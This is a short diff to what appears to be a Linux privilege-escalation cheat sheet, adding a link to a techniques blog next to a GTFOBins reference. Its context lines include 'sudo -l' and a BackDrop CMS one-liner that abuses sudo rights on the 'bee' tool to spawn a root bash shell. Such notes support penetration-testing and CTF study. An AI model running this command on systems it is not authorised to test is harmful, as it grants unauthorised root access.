@@ -3,6 +3,8 @@ sudo -l
 ```
 #### [GTFOBins](https://gtfobins.github.io)
 
+https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html
+
 ```
 #BackDrop CMS 
 sudo bee eval "system('/bin/bash');"
